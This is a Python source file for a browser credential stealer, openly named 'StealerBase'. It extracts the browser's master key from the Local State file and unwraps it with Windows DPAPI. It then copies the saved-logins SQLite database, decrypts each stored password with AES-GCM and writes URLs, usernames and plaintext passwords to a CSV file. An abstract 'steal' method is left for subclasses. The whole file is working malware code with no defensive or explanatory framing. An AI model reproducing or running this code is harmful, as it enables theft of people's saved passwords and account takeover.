from abc import ABC, abstractmethod

import json
import base64
import win32crypt
import logging
import shutil
import sqlite3
from Cryptodome.Cipher import AES

from func import *

class StealerBase(ABC):

    PATH = None
    LOCAL_STATE = None

    def get_secret_key(self):
        try:
            with open(self.__class__.LOCAL_STATE, 'r', encoding='utf-8') as f:
                local_state = f.read()
                local_state = json.loads(local_state)
            secret_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
            secret_key = secret_key[5:] # Remove suffix DPAPI
            secret_key = win32crypt.CryptUnprotectData(secret_key, None, None, None, 0)[1]
            return secret_key
        except Exception as e:
            logging.error("Secret key not found")
            logging.error(e)
            return None

    def get_db_connection(self, login_db):
        try:
            shutil.copy2(login_db, f"{MODULES_DIR}\\stealer\\Loginvault.db") 
            return sqlite3.connect(f"{MODULES_DIR}\\stealer\\Loginvault.db")
        except Exception as e:
            logging.error("Database cannot be found")
            logging.error(e)
            return None

    def decrypt_database(self, cursor, key, writer):
        cursor.execute("SELECT action_url, username_value, password_value FROM logins")
        for index, login in enumerate(cursor.fetchall()):
            url = login[0]
            username = login[1]
            ciphertext = login[2]
            decrypted_password = "** fail **"

            if (url == ""):
                continue
            if (ciphertext):
                decrypted_password = self.decrypt_password(ciphertext, key)
            writer.writerow([str(index), url, username, decrypted_password])

    def generate_cipher(self, aes_key, iv):
        return AES.new(aes_key, AES.MODE_GCM, iv)

    def decrypt_password(self, ciphertext, secret_key):
        try:
            initialisation_vector = ciphertext[3:15]
            encrypted_password = ciphertext[15:-16]
            cipher = self.generate_cipher(secret_key, initialisation_vector)
            decrypted_pass = cipher.decrypt(encrypted_password)
            decrypted_pass = decrypted_pass.decode() 
            return decrypted_pass
        except Exception as e:
            logging.error("Error during password decrypt")
            logging.error(e)
            return None

    @abstractmethod
    def steal(self, writer):
        pass